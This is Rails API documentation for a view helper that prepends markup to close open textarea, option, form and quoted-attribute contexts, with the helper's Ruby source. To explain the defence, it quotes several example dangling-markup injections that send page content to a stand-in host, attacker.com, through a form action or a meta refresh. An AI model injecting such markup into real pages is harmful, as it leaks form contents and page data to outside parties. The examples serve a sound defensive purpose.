<h1 id="module-ActionView::Helpers::ContentExfiltrationPreventionHelper" class="module"> module ActionView::Helpers::ContentExfiltrationPreventionHelper </h1>  <section id="5Buntitled-5D" class="documentation-section"> <section class="constants-list"> <header> <h3>Constants</h3> </header> <dl> <dt id="CLOSE_CDATA_COMMENT">CLOSE_CDATA_COMMENT </dt>
<dd>
<p>Close any open tags that support CDATA (textarea, xmp) before each form tag. This prevents attackers from injecting unclosed tags that could capture form contents.</p> <p>For example, an attacker might inject:</p> <pre>&lt;form action="https://attacker.com"&gt;&lt;textarea&gt;</pre> <p>The HTML following this tag, up until the next <code>&lt;/textarea&gt;</code> or the end of the document would be captured by the attacker’s <code>&lt;textarea&gt;</code>. By closing any open textarea tags, we ensure that form contents are never exfiltrated.</p> </dd>
<dt id="CLOSE_FORM_TAG">CLOSE_FORM_TAG </dt>
<dd>
<p>Close any open form tags before each new form tag. This prevents attackers from injecting unclosed forms that could leak markup offsite.</p> <p>For example, an attacker might inject:</p> <pre>&lt;form action="https://attacker.com"&gt;</pre> <p>The form elements following this tag, up until the next <code>&lt;/form&gt;</code> would be captured by the attacker’s <code>&lt;form&gt;</code>. By closing any open form tags, we ensure that form contents are never exfiltrated.</p> </dd>
<dt id="CLOSE_OPTION_TAG">CLOSE_OPTION_TAG </dt>
<dd>
<p>Close any open option tags before each form tag. This prevents attackers from injecting unclosed options that could leak markup offsite.</p> <p>For example, an attacker might inject:</p> <pre>&lt;form action="https://attacker.com"&gt;&lt;option&gt;</pre> <p>The HTML following this tag, up until the next <code>&lt;/option&gt;</code> or the end of the document would be captured by the attacker’s <code>&lt;option&gt;</code>. By closing any open option tags, we ensure that form contents are never exfiltrated.</p> </dd>
<dt id="CLOSE_QUOTES_COMMENT">CLOSE_QUOTES_COMMENT </dt>
<dd>
<p>Close any open attributes before each form tag. This prevents attackers from injecting partial tags that could leak markup offsite.</p> <p>For example, an attacker might inject:</p> <pre>&lt;meta http-equiv="refresh" content='0;URL=https://attacker.com?</pre> <p>The HTML following this tag, up until the next single quote would be sent to <code>https://attacker.com</code>. By closing any open attributes, we ensure that form contents are never exfiltrated this way.</p> </dd>
<dt id="CONTENT_EXFILTRATION_PREVENTION_MARKUP">CONTENT_EXFILTRATION_PREVENTION_MARKUP </dt>

</dl> </section> <section id="public-instance-5Buntitled-5D-method-details" class="method-section"> <header> <h3>Public Instance Methods</h3> </header> <div class="method-detail "> <div class="method-header"> <div class="method-heading" id="method-i-prevent_content_exfiltration"> <span class="method-name">prevent_content_exfiltration</span><span class="method-args">(html)</span> <a class="method-click-advice">Show source</a> </div> </div> <div class="method-description">
<div class="method-source-code" id="prevent_content_exfiltration-source"> <pre class="ruby" data-language="ruby"># File actionview/lib/action_view/helpers/content_exfiltration_prevention_helper.rb, line 61
def prevent_content_exfiltration(html)
  if prepend_content_exfiltration_prevention
    CONTENT_EXFILTRATION_PREVENTION_MARKUP + html
  else
    html
  end
end</pre> </div>  </div> </div> </section> </section><div class="_attribution">
  <p class="_attribution-p">
    &copy; 2004&ndash;2021 David Heinemeier Hansson<br>Licensed under the MIT License.<br>
    
  </p>
</div>
